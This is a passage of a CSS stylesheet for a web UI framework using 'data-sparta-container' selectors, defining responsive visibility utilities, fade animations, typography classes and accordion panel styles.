        [data-sparta-container] .show-for-xxlarge-only,
        [data-sparta-container] .show-for-xxlarge-up {
            display: none !important
        }

        .medium-up [data-sparta-container] .hide-for-medium-only,
        .medium-up [data-sparta-container] .hide-for-medium-up,
        .medium-up [data-sparta-container] .show-for-small-only {
            display: none !important
        }

        .medium-up [data-sparta-container] .hide-for-small-only,
        .medium-up [data-sparta-container] .show-for-medium-only,
        .medium-up [data-sparta-container] .show-for-medium-up {
            display: inherit !important
        }

        .large-up [data-sparta-container] .hide-for-large-only,
        .large-up [data-sparta-container] .hide-for-large-up,
        .large-up [data-sparta-container] .show-for-medium-only {
            display: none !important
        }

        .large-up [data-sparta-container] .hide-for-medium-only,
        .large-up [data-sparta-container] .hide-for-small-only,
        .large-up [data-sparta-container] .show-for-large-only,
        .large-up [data-sparta-container] .show-for-large-up {
            display: inherit !important
        }

        .xlarge-up [data-sparta-container] .hide-for-xlarge-only,
        .xlarge-up [data-sparta-container] .hide-for-xlarge-up,
        .xlarge-up [data-sparta-container] .show-for-large-only {
            display: none !important
        }

        .xlarge-up [data-sparta-container] .hide-for-large-only,
        .xlarge-up [data-sparta-container] .hide-for-medium-only,
        .xlarge-up [data-sparta-container] .hide-for-small-only,
        .xlarge-up [data-sparta-container] .show-for-xlarge-only,
        .xlarge-up [data-sparta-container] .show-for-xlarge-up {
            display: inherit !important
        }

        .xxlarge-up [data-sparta-container] .hide-for-xxlarge-only,
        .xxlarge-up [data-sparta-container] .hide-for-xxlarge-up,
        .xxlarge-up [data-sparta-container] .show-for-xxlarge-only {
            display: none !important
        }

        .xxlarge-up [data-sparta-container] .hide-for-large-only,
        .xxlarge-up [data-sparta-container] .hide-for-medium-only,
        .xxlarge-up [data-sparta-container] .hide-for-small-only,
        .xxlarge-up [data-sparta-container] .hide-for-xlarge-only,
        .xxlarge-up [data-sparta-container] .show-for-xxlarge-only,
        .xxlarge-up [data-sparta-container] .show-for-xxlarge-up {
            display: inherit !important
        }

        [data-sparta-wrapper].sparta-media-query-utility-loading:not([data-sparta-widget]) .show-for-small-only,
        [data-sparta-wrapper].sparta-media-query-utility-loading:not([data-sparta-widget]) .show-for-small-up,
        [data-sparta-container].spa-ui-layer.spa-ui-modal .show-for-small-only,
        [data-sparta-container].spa-ui-layer.spa-ui-modal .show-for-small-up {
            display: inherit !important
        }

        [data-sparta-wrapper].sparta-media-query-utility-loading:not([data-sparta-widget]) .hide-for-small-only,
        [data-sparta-wrapper].sparta-media-query-utility-loading:not([data-sparta-widget]) .hide-for-small-up,
        [data-sparta-wrapper].sparta-media-query-utility-loading:not([data-sparta-widget]) .show-for-large-only,
        [data-sparta-wrapper].sparta-media-query-utility-loading:not([data-sparta-widget]) .show-for-large-up,
        [data-sparta-wrapper].sparta-media-query-utility-loading:not([data-sparta-widget]) .show-for-medium-only,
        [data-sparta-wrapper].sparta-media-query-utility-loading:not([data-sparta-widget]) .show-for-medium-up,
        [data-sparta-wrapper].sparta-media-query-utility-loading:not([data-sparta-widget]) .show-for-xlarge-only,
        [data-sparta-wrapper].sparta-media-query-utility-loading:not([data-sparta-widget]) .show-for-xlarge-up,
        [data-sparta-wrapper].sparta-media-query-utility-loading:not([data-sparta-widget]) .show-for-xxlarge-only,
        [data-sparta-wrapper].sparta-media-query-utility-loading:not([data-sparta-widget]) .show-for-xxlarge-up,
        [data-sparta-container].spa-ui-layer.spa-ui-modal .hide-for-small-only,
        [data-sparta-container].spa-ui-layer.spa-ui-modal .hide-for-small-up,
        [data-sparta-container].spa-ui-layer.spa-ui-modal .show-for-large-only,
        [data-sparta-container].spa-ui-layer.spa-ui-modal .show-for-large-up,
        [data-sparta-container].spa-ui-layer.spa-ui-modal .show-for-medium-only,
        [data-sparta-container].spa-ui-layer.spa-ui-modal .show-for-medium-up,
        [data-sparta-container].spa-ui-layer.spa-ui-modal .show-for-xlarge-only,
        [data-sparta-container].spa-ui-layer.spa-ui-modal .show-for-xlarge-up,
        [data-sparta-container].spa-ui-layer.spa-ui-modal .show-for-xxlarge-only,
        [data-sparta-container].spa-ui-layer.spa-ui-modal .show-for-xxlarge-up {
            display: none !important
        }

        @media only screen and (min-width: 768px) {

            [data-sparta-wrapper].sparta-media-query-utility-loading:not([data-sparta-widget]) .hide-for-medium-only,
            [data-sparta-wrapper].sparta-media-query-utility-loading:not([data-sparta-widget]) .hide-for-medium-up,
            [data-sparta-wrapper].sparta-media-query-utility-loading:not([data-sparta-widget]) .show-for-small-only,
            [data-sparta-container].spa-ui-layer.spa-ui-modal .hide-for-medium-only,
            [data-sparta-container].spa-ui-layer.spa-ui-modal .hide-for-medium-up,
            [data-sparta-container].spa-ui-layer.spa-ui-modal .show-for-small-only {
                display: none !important
            }

            [data-sparta-wrapper].sparta-media-query-utility-loading:not([data-sparta-widget]) .hide-for-small-only,
            [data-sparta-wrapper].sparta-media-query-utility-loading:not([data-sparta-widget]) .show-for-medium-only,
            [data-sparta-wrapper].sparta-media-query-utility-loading:not([data-sparta-widget]) .show-for-medium-up,
            [data-sparta-container].spa-ui-layer.spa-ui-modal .hide-for-small-only,
            [data-sparta-container].spa-ui-layer.spa-ui-modal .show-for-medium-only,
            [data-sparta-container].spa-ui-layer.spa-ui-modal .show-for-medium-up {
                display: inherit !important
            }
        }

        @media only screen and (min-width: 1025px) {

            [data-sparta-wrapper].sparta-media-query-utility-loading:not([data-sparta-widget]) .hide-for-large-only,
            [data-sparta-wrapper].sparta-media-query-utility-loading:not([data-sparta-widget]) .hide-for-large-up,
            [data-sparta-wrapper].sparta-media-query-utility-loading:not([data-sparta-widget]) .show-for-medium-only,
            [data-sparta-container].spa-ui-layer.spa-ui-modal .hide-for-large-only,
            [data-sparta-container].spa-ui-layer.spa-ui-modal .hide-for-large-up,
            [data-sparta-container].spa-ui-layer.spa-ui-modal .show-for-medium-only {
                display: none !important
            }

            [data-sparta-wrapper].sparta-media-query-utility-loading:not([data-sparta-widget]) .hide-for-medium-only,
            [data-sparta-wrapper].sparta-media-query-utility-loading:not([data-sparta-widget]) .hide-for-small-only,
            [data-sparta-wrapper].sparta-media-query-utility-loading:not([data-sparta-widget]) .show-for-large-only,
            [data-sparta-wrapper].sparta-media-query-utility-loading:not([data-sparta-widget]) .show-for-large-up,
            [data-sparta-container].spa-ui-layer.spa-ui-modal .hide-for-medium-only,
            [data-sparta-container].spa-ui-layer.spa-ui-modal .hide-for-small-only,
            [data-sparta-container].spa-ui-layer.spa-ui-modal .show-for-large-only,
            [data-sparta-container].spa-ui-layer.spa-ui-modal .show-for-large-up {
                display: inherit !important
            }
        }

        .xlarge-up [data-sparta-wrapper].sparta-media-query-utility-loading:not([data-sparta-widget]) .hide-for-xlarge-only,
        .xlarge-up [data-sparta-wrapper].sparta-media-query-utility-loading:not([data-sparta-widget]) .hide-for-xlarge-up,
        .xlarge-up [data-sparta-wrapper].sparta-media-query-utility-loading:not([data-sparta-widget]) .show-for-large-only,
        .xlarge-up [data-sparta-container].spa-ui-layer.spa-ui-modal .hide-for-xlarge-only,
        .xlarge-up [data-sparta-container].spa-ui-layer.spa-ui-modal .hide-for-xlarge-up,
        .xlarge-up [data-sparta-container].spa-ui-layer.spa-ui-modal .show-for-large-only {
            display: none !important
        }

        .xlarge-up [data-sparta-wrapper].sparta-media-query-utility-loading:not([data-sparta-widget]) .hide-for-large-only,
        .xlarge-up [data-sparta-wrapper].sparta-media-query-utility-loading:not([data-sparta-widget]) .hide-for-medium-only,
        .xlarge-up [data-sparta-wrapper].sparta-media-query-utility-loading:not([data-sparta-widget]) .hide-for-small-only,
        .xlarge-up [data-sparta-wrapper].sparta-media-query-utility-loading:not([data-sparta-widget]) .show-for-xlarge-only,
        .xlarge-up [data-sparta-wrapper].sparta-media-query-utility-loading:not([data-sparta-widget]) .show-for-xlarge-up,
        .xlarge-up [data-sparta-container].spa-ui-layer.spa-ui-modal .hide-for-large-only,
        .xlarge-up [data-sparta-container].spa-ui-layer.spa-ui-modal .hide-for-medium-only,
        .xlarge-up [data-sparta-container].spa-ui-layer.spa-ui-modal .hide-for-small-only,
        .xlarge-up [data-sparta-container].spa-ui-layer.spa-ui-modal .show-for-xlarge-only,
        .xlarge-up [data-sparta-container].spa-ui-layer.spa-ui-modal .show-for-xlarge-up {
            display: inherit !important
        }

        .xxlarge-up [data-sparta-wrapper].sparta-media-query-utility-loading:not([data-sparta-widget]) .hide-for-xxlarge-only,
        .xxlarge-up [data-sparta-wrapper].sparta-media-query-utility-loading:not([data-sparta-widget]) .hide-for-xxlarge-up,
        .xxlarge-up [data-sparta-wrapper].sparta-media-query-utility-loading:not([data-sparta-widget]) .show-for-xlarge-only,
        .xxlarge-up [data-sparta-container].spa-ui-layer.spa-ui-modal .hide-for-xxlarge-only,
        .xxlarge-up [data-sparta-container].spa-ui-layer.spa-ui-modal .hide-for-xxlarge-up,
        .xxlarge-up [data-sparta-container].spa-ui-layer.spa-ui-modal .show-for-xlarge-only {
            display: none !important
        }

        .xxlarge-up [data-sparta-wrapper].sparta-media-query-utility-loading:not([data-sparta-widget]) .hide-for-large-only,
        .xxlarge-up [data-sparta-wrapper].sparta-media-query-utility-loading:not([data-sparta-widget]) .hide-for-medium-only,
        .xxlarge-up [data-sparta-wrapper].sparta-media-query-utility-loading:not([data-sparta-widget]) .hide-for-small-only,
        .xxlarge-up [data-sparta-wrapper].sparta-media-query-utility-loading:not([data-sparta-widget]) .hide-for-xlarge-only,
        .xxlarge-up [data-sparta-wrapper].sparta-media-query-utility-loading:not([data-sparta-widget]) .show-for-xxlarge-only,
        .xxlarge-up [data-sparta-wrapper].sparta-media-query-utility-loading:not([data-sparta-widget]) .show-for-xxlarge-up,
        .xxlarge-up [data-sparta-container].spa-ui-layer.spa-ui-modal .hide-for-large-only,
        .xxlarge-up [data-sparta-container].spa-ui-layer.spa-ui-modal .hide-for-medium-only,
        .xxlarge-up [data-sparta-container].spa-ui-layer.spa-ui-modal .hide-for-small-only,
        .xxlarge-up [data-sparta-container].spa-ui-layer.spa-ui-modal .hide-for-xlarge-only,
        .xxlarge-up [data-sparta-container].spa-ui-layer.spa-ui-modal .show-for-xxlarge-only,
        .xxlarge-up [data-sparta-container].spa-ui-layer.spa-ui-modal .show-for-xxlarge-up {
            display: inherit !important
        }

        [data-sparta-container] .mda-show,
        [data-sparta-container] .show-for-mda {
            display: none
        }

        .mda [data-sparta-container] .mda-show,
        .mda [data-sparta-container] .show-for-mda {
            display: inherit !important
        }

        .mda [data-sparta-container] .mda-hide,
        .mda [data-sparta-container] .hide-for-mda {
            display: none !important
        }

        @-webkit-keyframes fadeOut {
            0% {
                visibility: visible;
                opacity: 1;
                height: auto
            }

            99% {
                visibility: hidden;
                opacity: 0;
                height: auto
            }

            100% {
                visibility: hidden;
                opacity: 0;
                height: 0
            }
        }

        @keyframes fadeOut {
            0% {
                visibility: visible;
                opacity: 1;
                height: auto
            }

            99% {
                visibility: hidden;
                opacity: 0;
                height: auto
            }

            100% {
                visibility: hidden;
                opacity: 0;
                height: 0
            }
        }

        @-webkit-keyframes fadeIn {
            0% {
                visibility: hidden;
                opacity: 0;
                height: 0
            }

            1% {
                visibility: visible;
                height: auto;
                opacity: 0
            }

            100% {
                visibility: visible;
                opacity: 1;
                height: auto
            }
        }

        @keyframes fadeIn {
            0% {
                visibility: hidden;
                opacity: 0;
                height: 0
            }

            1% {
                visibility: visible;
                height: auto;
                opacity: 0
            }

            100% {
                visibility: visible;
                opacity: 1;
                height: auto
            }
        }

        @-webkit-keyframes noneOut {
            0% {
                visibility: visible;
                opacity: 1;
                height: auto
            }

            99% {
                visibility: hidden;
                opacity: 0;
                height: auto
            }

            100% {
                visibility: hidden;
                opacity: 0;
                height: 0
            }
        }

        @keyframes noneOut {
            0% {
                visibility: visible;
                opacity: 1;
                height: auto
            }

            99% {
                visibility: hidden;
                opacity: 0;
                height: auto
            }

            100% {
                visibility: hidden;
                opacity: 0;
                height: 0
            }
        }

        @-webkit-keyframes noneIn {
            0% {
                visibility: hidden;
                opacity: 0;
                height: 0
            }

            1% {
                visibility: visible;
                height: auto;
                opacity: 0
            }

            100% {
                visibility: visible;
                opacity: 1;
                height: auto
            }
        }

        @keyframes noneIn {
            0% {
                visibility: hidden;
                opacity: 0;
                height: 0
            }

            1% {
                visibility: visible;
                height: auto;
                opacity: 0
            }

            100% {
                visibility: visible;
                opacity: 1;
                height: auto
            }
        }

        [data-sparta-container] .sparta-animate-fade-out,
        [data-sparta-container] .sparta-animate-fade-in {
            -webkit-animation-iteration-count: 1;
            animation-iteration-count: 1;
            -webkit-animation-duration: 1.5s;
            animation-duration: 1.5s;
            -webkit-animation-fill-mode: both;
            animation-fill-mode: both
        }

        [data-sparta-container] .sparta-animate-none-out,
        [data-sparta-container] .sparta-animate-none-in {
            -webkit-animation-iteration-count: 1;
            animation-iteration-count: 1;
            -webkit-animation-duration: 0s;
            animation-duration: 0s;
            -webkit-animation-fill-mode: both;
            animation-fill-mode: both
        }

        [data-sparta-container] .sparta-animate-fade-out {
            -webkit-animation-name: fadeOut;
            animation-name: fadeOut
        }

        [data-sparta-container] .sparta-animate-fade-in {
            -webkit-animation-name: fadeIn;
            animation-name: fadeIn
        }

        [data-sparta-container] .sparta-animate-none-out {
            -webkit-animation-name: noneOut;
            animation-name: noneOut
        }

        [data-sparta-container] .sparta-animate-none-in {
            -webkit-animation-name: noneIn;
            animation-name: noneIn
        }

        [data-sparta-container] .text-left {
            text-align: left !important
        }

        [data-sparta-container] .text-right {
            text-align: right !important
        }

        [data-sparta-container] .text-center {
            text-align: center !important
        }

        [data-sparta-container] .text-justify {
            text-align: justify !important
        }

        [data-sparta-container] .spa-header--1 {
            font: 22px "cnx-regular", Arial, Helvetica, sans-serif !important;
            color: #fff !important
        }

        [data-sparta-container] .spa-header--1a {
            font: 22px "cnx-regular", Arial, Helvetica, sans-serif !important
        }

        [data-sparta-container] .spa-header--2 {
            font: 22px "cnx-medium", Arial, Helvetica, sans-serif !important;
            color: #012169 !important
        }

        @media only screen and (min-width: 768px) {
            [data-sparta-container] .spa-header--2 {
                font-size: 24px !important
            }
        }

        [data-sparta-container] .spa-header--2a {
            font: 22px "cnx-regular", Arial, Helvetica, sans-serif !important;
            color: #012169 !important
        }

        @media only screen and (min-width: 768px) {
            [data-sparta-container] .spa-header--2a {
                font-size: 24px !important
            }
        }

        [data-sparta-container] .spa-header--3 {
            font: 20px "cnx-regular", Arial, Helvetica, sans-serif !important;
            line-height: 18px !important;
            color: #012169 !important
        }

        @media only screen and (min-width: 768px) {
            [data-sparta-container] .spa-header--3 {
                font: 24px !important;
                line-height: 20px !important
            }
        }

        [data-sparta-container] .spa-header--4 {
            font: 18px "cnx-regular", Arial, Helvetica, sans-serif !important;
            line-height: 16px !important;
            color: #012169 !important
        }

        @media only screen and (min-width: 768px) {
            [data-sparta-container] .spa-header--4 {
                font: 20px !important;
                line-height: 18px !important
            }
        }

        [data-sparta-container] .spa-header--5 {
            font: 16px Arial, Helvetica, sans-serif !important;
            color: #fff !important
        }

        [data-sparta-container] .spa-header--5a {
            font: 16px Arial, Helvetica, sans-serif !important
        }

        [data-sparta-container] .spa-content--1 {
            font: 18px "cnx-regular", Arial, Helvetica, sans-serif !important;
            color: #6b5e51 !important
        }

        @media only screen and (min-width: 768px) {
            [data-sparta-container] .spa-content--1 {
                font-size: 20px !important
            }
        }

        [data-sparta-container] .spa-content--1b {
            font: 18px "cnx-regular", Arial, Helvetica, sans-serif !important;
            color: #DC1431 !important
        }

        @media only screen and (min-width: 768px) {
            [data-sparta-container] .spa-content--1b {
                font-size: 20px !important
            }
        }

        [data-sparta-container] .spa-content--2 {
            font: 18px Arial, Helvetica, sans-serif !important;
            line-height: 14px !important;
            color: #524940 !important
        }

        [data-sparta-container] .spa-content--2a {
            font: 16px Arial, Helvetica, sans-serif !important;
            line-height: 12px !important;
            color: #524940 !important
        }

        @media only screen and (min-width: 768px) {
            [data-sparta-container] .spa-content--2a {
                font: 18px !important;
                line-height: 14px !important
            }
        }

        [data-sparta-container] .spa-content--2b {
            font: 16px Arial, Helvetica, sans-serif !important;
            line-height: 12px !important;
            color: #524940 !important
        }

        [data-sparta-container] .spa-content--3 {
            font: 16px Arial, Helvetica, sans-serif !important;
            line-height: 12px !important;
            color: #fff !important
        }

        [data-sparta-container] .spa-content--4 {
            font: bold 16px Arial, Helvetica, sans-serif !important;
            line-height: 14px !important;
            color: #666 !important
        }

        @media only screen and (min-width: 768px) {
            [data-sparta-container] .spa-content--4 {
                color: #524940 !important
            }
        }

        [data-sparta-container] .spa-content--5 {
            font: bold 14px Arial, Helvetica, sans-serif !important;
            line-height: 14px !important;
            color: #524940 !important
        }

        [data-sparta-container] .spa-content--5a {
            font: 14px Arial, Helvetica, sans-serif !important;
            line-height: 14px !important;
            color: #524940 !important
        }

        [data-sparta-container] .spa-content--6 {
            font: bold 16px Arial, Helvetica, sans-serif !important;
            line-height: 14px !important;
            color: #524940 !important
        }

        [data-sparta-container] .spa-content--7 {
            font: 16px "cnx-regular", Arial, Helvetica, sans-serif !important;
            color: #6b5e51 !important
        }

        @media only screen and (min-width: 768px) {
            [data-sparta-container] .spa-content--7 {
                font-size: 18px !important
            }
        }

        [data-sparta-container] .spa-content--8 {
            font: 20px Arial, Helvetica, sans-serif !important;
            line-height: 16px !important;
            color: #666 !important
        }

        [data-sparta-container] .spa-content--8a {
            font: 18px Arial, Helvetica, sans-serif !important;
            color: #666 !important
        }

        [data-sparta-container] .spa-content--8b {
            font: 14px Arial, Helvetica, sans-serif !important;
            line-height: 20px !important;
            color: #524940 !important
        }

        @media only screen and (min-width: 768px) {
            [data-sparta-container] .spa-content--8b {
                font-size: 16px !important
            }
        }

        [data-sparta-container] .spa-content--9 {
            font: 14px Arial, Helvetica, sans-serif !important;
            line-height: 16px !important;
            color: #524940 !important
        }

        @media only screen and (min-width: 768px) {
            [data-sparta-container] .spa-content--9 {
                font-weight: bold !important;
                font-size: 20px !important
            }
        }

        [data-sparta-container] .spa-required {
            font: 11px Arial, Helvetica, sans-serif !important;
            color: #000 !important
        }

        @media only screen and (min-width: 768px) {
            [data-sparta-container] .spa-required {
                font-size: 13px !important
            }
        }

        [data-sparta-container] .spa-messaging--title {
            font: bold 12px Arial, Helvetica, sans-serif !important;
            color: #524940 !important;
            position: absolute;
            top: 50%;
            -webkit-transform: translateY(-50%);
            transform: translateY(-50%)
        }

        @media only screen and (min-width: 768px) {
            [data-sparta-container] .spa-messaging--title {
                font-size: 14px !important
            }
        }

        [data-sparta-container] .spa-messaging--body {
            font: 16px Arial, Helvetica, sans-serif !important;
            line-height: 12px !important;
            color: #524940 !important
        }

        @media only screen and (min-width: 768px) {
            [data-sparta-container] .spa-messaging--body {
                font: 18px !important;
                line-height: 14px !important
            }
        }

        [data-sparta-container] .spa-link {
            font: 14px Arial, Helvetica, sans-serif !important;
            color: #0052C2 !important
        }

        [data-sparta-container] .spa-link--a {
            font: 14px Arial, Helvetica, sans-serif !important;
            color: #0052C2 !important
        }

        [data-sparta-container] .spa-link--b {
            font: 14px Arial, Helvetica, sans-serif !important
        }

        [data-sparta-container] .spa-footnote {
            font: 13px Arial, Helvetica, sans-serif !important;
            color: #6b5e51 !important
        }

        [data-sparta-container] .spa-tagline {
            letter-spacing: .25em;
            line-height: 1.1;
            text-transform: uppercase;
            font: 1em "cnx-regular-cond", Arial, Helvetica, sans-serif !important;
            -webkit-font-smoothing: auto;
            color: #000
        }

        [data-sparta-container] .spa-tagline-inverse .spa-tagline {
            color: #fff
        }

        [data-sparta-container] .spa-tagline-campaign {
            position: relative;
            display: inline-block;
            padding-top: .6em
        }

        [data-sparta-container] .spa-tagline-campaign::before {
            position: absolute;
            content: '';
            width: 21%;
            top: 0;
            border-bottom: 3px solid #0073CF
        }

        [data-sparta-container] .spa-tagline-campaign::after {
            position: absolute;
            content: '';
            width: 74.75%;
            left: 23.5%;
            top: 0;
            border-top: 3px solid #DC1431
        }

        [data-sparta-container] .spa-tagline-glass {
            position: relative;
            width: 100%;
            height: 100%
        }

        [data-sparta-container] .spa-tagline-glass-title {
            position: absolute;
            left: 0;
            right: 0;
            padding: 1em;
            text-align: center;
            background: rgba(255, 255, 255, 0.8);
            -webkit-backdrop-filter: blur(5px);
            backdrop-filter: blur(5px)
        }

        [data-sparta-container] .spa-tagline-glass-title--top {
            top: 0
        }

        [data-sparta-container] .spa-tagline-glass-title--bottom {
            bottom: 0
        }

        [data-sparta-container] .spa-tagline-glass-title :last-child {
            margin-bottom: 0
        }

        [data-sparta-container] .spa-tagline-shadow {
            width: 100%;
            height: 100%;
            display: -ms-flexbox;
            display: -webkit-flex;
            display: -webkit-box;
            display: flex;
            -ms-flex-align: center;
            -webkit-align-items: center;
            -webkit-box-align: center;
            align-items: center;
            text-align: center;
            background: -webkit-linear-gradient(top, transparent 0%, rgba(0, 0, 0, 0.5) 50%, rgba(0, 0, 0, 0.5) 50%, transparent 100%);
            background: linear-gradient(to bottom, transparent 0%, rgba(0, 0, 0, 0.5) 50%, rgba(0, 0, 0, 0.5) 50%, transparent 100%)
        }

        [data-sparta-container] .spa-tagline-shadow-title {
            width: 100%;
            color: #fff
        }

        [data-sparta-container] .spa-tagline-shadow-title .spa-tagline {
            color: #fff !important
        }

        [data-sparta-widget].sparta-widget-loading * {
            visibility: hidden !important
        }

        [data-sparta-container] {
            background: #fff;
            color: #222;
            cursor: auto;
            font-family: Arial, "Helvetica Neue", Helvetica, Roboto, sans-serif
        }

        [data-sparta-container] .hidden,
        [data-sparta-container] .hide {
            display: none
        }

        [data-sparta-container] .spa-hidden {
            display: none !important
        }

        [data-sparta-container] .preload-images {
            position: absolute;
            left: -10000px
        }

        [data-sparta-container] .spa-invisible {
            opacity: 0
        }

        [data-sparta-container] .spa-module-has-rule {
            opacity: 0
        }

        [data-sparta-container] .focus-trap-utility [class^="focus-boundary"] {
            position: absolute;
            z-index: 1002;
            top: 0;
            left: 0;
            background-color: #fff;
            padding: 3px;
            color: #524940;
            outline: 1px dotted;
            margin: 5px
        }

        [data-sparta-container] .focus-trap-utility [class^="focus-boundary"]:not(:focus) {
            opacity: 0;
            pointer-events: none;
            height: 0;
            width: 0;
            overflow: hidden
        }

        [data-sparta-container] .focus-trap-utility [class^="focus-boundary"].focus-boundary-bounce,
        [data-sparta-container] .focus-trap-utility [class^="focus-boundary"].focus-boundary-bottom {
            bottom: 0;
            top: auto
        }

        [data-sparta-container] .accordion-wrapper {
            margin-bottom: 20px
        }

        [data-sparta-container] .accordion-wrapper>.accordion-group-control-wrapper {
            text-align: right
        }

        [data-sparta-container] .accordion-wrapper.all-panels-open>.accordion-group-control-wrapper>.accordion-group-control.accordion-expand-all-link,
        [data-sparta-container] .accordion-wrapper.all-panels-open>.accordion-group-control-wrapper>.accordion-link-divider {
            display: none
        }

        [data-sparta-container] .accordion-wrapper.all-panels-closed>.accordion-group-control-wrapper>.accordion-group-control.accordion-collapse-all-link,
        [data-sparta-container] .accordion-wrapper.all-panels-closed>.accordion-group-control-wrapper>.accordion-link-divider {
            display: none
        }

        [data-sparta-container] .accordion-wrapper .accordion-tablist {
            display: none;
            visibility: hidden
        }

        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header {
            display: block;
            position: relative;
            cursor: pointer;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
            font-family: "cnx-regular", Helvetica, Arial, sans-serif;
            line-height: 20px;
            text-decoration: none;
            color: #6b5e51;
            background-color: #ECE7DD;
            padding: 10px 10px 10px 30px;
            margin: 10px 0 0 0;
            -webkit-transition: background-color 500ms;
            transition: background-color 500ms
        }

        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header:hover,
        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header:focus {
            background-color: #D1C9C0
        }

        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header .spa-accordion-arrow {
            position: absolute;
            top: 10px;
            left: 5px
        }

        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header .spa-arrow-btn:hover:before,
        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header .spa-arrow-btn:hover:after {
            background-color: #6b5e51
        }

        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.blue {
            background-color: #0073CF
        }

        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.blue:hover,
        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.blue:focus {
            background-color: #0052C2
        }

        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.red {
            background-color: #DC1431
        }

        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.red:hover,
        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.red:focus {
            background-color: #C41230
        }

        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.light {
            color: #6b5e51;
            background-color: #f1efec
        }

        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.light:hover,
        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.light:focus {
            background-color: #D1C9C0
        }

        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.transparent {
            background-color: transparent
        }

        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.transparent:hover,
        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.transparent:focus {
            background-color: #F9F7F4
        }

        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.red,
        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.blue {
            color: #fff
        }

        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.red .spa-arrow-btn:before,
        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.red .spa-arrow-btn:after,
        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.red .spa-arrow-btn:hover:before,
        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.red .spa-arrow-btn:hover:after,
        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.blue .spa-arrow-btn:before,
        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.blue .spa-arrow-btn:after,
        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.blue .spa-arrow-btn:hover:before,
        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.blue .spa-arrow-btn:hover:after {
            background-color: #fff
        }

        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.light:hover,
        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.light:focus,
        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.transparent:hover,
        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.transparent:focus {
            color: #524940
        }

        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.light:hover .spa-arrow-btn:before,
        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.light:hover .spa-arrow-btn:after,
        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.light:hover .spa-arrow-btn:hover:before,
        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.light:hover .spa-arrow-btn:hover:after,
        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.light:focus .spa-arrow-btn:before,
        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.light:focus .spa-arrow-btn:after,
        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.light:focus .spa-arrow-btn:hover:before,
        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.light:focus .spa-arrow-btn:hover:after,
        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.transparent:hover .spa-arrow-btn:before,
        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.transparent:hover .spa-arrow-btn:after,
        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.transparent:hover .spa-arrow-btn:hover:before,
        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.transparent:hover .spa-arrow-btn:hover:after,
        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.transparent:focus .spa-arrow-btn:before,
        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.transparent:focus .spa-arrow-btn:after,
        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.transparent:focus .spa-arrow-btn:hover:before,
        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.transparent:focus .spa-arrow-btn:hover:after {
            background-color: #524940
        }

        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.light .spa-arrow-btn:before,
        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.light .spa-arrow-btn:after,
        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.light .spa-arrow-btn:hover:before,
        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.light .spa-arrow-btn:hover:after {
            background-color: #6b5e51
        }

        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.transparent .spa-arrow-btn:before,
        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.transparent .spa-arrow-btn:after,
